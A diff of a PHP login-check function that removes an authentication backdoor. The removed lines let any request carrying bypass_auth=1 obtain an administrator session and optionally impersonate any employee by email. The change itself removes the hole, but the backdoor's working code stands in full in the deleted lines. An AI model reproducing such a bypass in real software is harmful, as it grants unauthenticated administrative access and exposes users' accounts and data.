@@ -107,29 +107,6 @@ function checkLogin()
         session_start();
     }
 
-    if (isset($_GET['bypass_auth']) && $_GET['bypass_auth'] == 1) {
-        $empId = 1;
-        $fullName = 'Bypass User';
-        $email = 'bypass@example.com';
-        if (isset($_GET['email']) && $_GET['email'] !== '') {
-            $emailQuery = $_GET['email'];
-            $res = db()->query("SELECT id, full_name, email FROM employees WHERE email = '" . db()->real_escape_string($emailQuery) . "' LIMIT 1");
-            if ($res && $row = $res->fetch_assoc()) {
-                $empId = $row['id'];
-                $fullName = $row['full_name'];
-                $email = $row['email'];
-            }
-        }
-        $_SESSION['user'] = [
-            'id' => 1,
-            'full_name' => $fullName,
-            'user_name' => 'bypass',
-            'email' => $email,
-            'role_id' => 1,
-            'employee_id' => $empId
-        ];
-    }
-
     // Detect AJAX request
     $isAjax = (
         (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest')
